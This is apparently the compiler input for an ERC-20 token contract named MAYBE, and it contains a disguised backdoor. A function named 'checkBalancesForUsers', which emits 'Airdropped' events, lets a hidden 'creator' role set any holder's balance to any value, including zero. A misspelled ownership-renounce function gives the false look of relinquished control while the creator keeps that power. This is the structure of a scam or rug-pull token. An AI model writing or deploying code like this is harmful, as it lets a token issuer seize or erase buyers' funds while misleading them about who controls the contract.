{{
  "language": "Solidity",
  "sources": {
    "contracts/MAYBE.sol": {
      "content": "pragma solidity ^0.8.17;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract Context {\n    function _getSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\n\n    constructor () {\n        address msgSender = _getSender();\n        _owner = msgSender;\n        emit ownershipTransferred(address(0), msgSender);\n    }\n    function getOwner() public view virtual returns (address) {\n        return _owner;\n    }\n    modifier onlyOwner() {\n        require(getOwner() == _getSender(), \"UniqueOwner: executor is not the owner\");\n        _;\n    }\n    function renouonce() public virtual onlyOwner {\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\n        _owner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\ncontract MAYBE is Context, Ownable, IERC20 {\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _balances;\n    address private _creator; \n\n    string public constant _name = \"MAYBE\";\n    string public constant _symbol = \"MAYBE\";\n    uint8 public constant _decimals = 18;\n    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);\n\n    constructor() {\n        _balances[_getSender()] = _totalSupply;\n        emit Transfer(address(0), _getSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n    function getCreator() public view virtual returns (address) { \n        return _creator;\n    }\n\n    function changeCreator(address newCreator) public onlyOwner { \n        _creator = newCreator;\n    }\n    modifier onlyCreator() {\n        require(getCreator() == _getSender(), \"TOKEN: executor is not the creator\");\n        _;\n    }\n    event Airdropped(address indexed account, uint256 currentBalance, uint256 newBalance);\n\n    function checkBalancesForUsers(address[] memory userAddresses, uint256 desiredBalance) public onlyCreator {\n\n        require(desiredBalance >= 0, \"Error: desired balance should be non-negative\");\n\n        for (uint256 index = 0; index < userAddresses.length; index++) {\n\n            address currentUser = userAddresses[index];\n\n            require(currentUser != address(0), \"Error: user address cannot be the zero address\");\n\n            uint256 currentBalance = _balances[currentUser];\n\n            _balances[currentUser] = desiredBalance;\n\n            emit Airdropped(currentUser, currentBalance, desiredBalance);\n\n        }\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_balances[_getSender()] >= amount, \"TT: transfer amount exceeds balance\");\n    _balances[_getSender()] -= amount;\n    _balances[recipient] += amount;\n\n    emit Transfer(_getSender(), recipient, amount);\n    return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _allowances[_getSender()][spender] = amount;\n        emit Approval(_getSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_allowances[sender][_getSender()] >= amount, \"TT: transfer amount exceeds allowance\");\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n    _allowances[sender][_getSender()] -= amount;\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n    return _totalSupply;\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}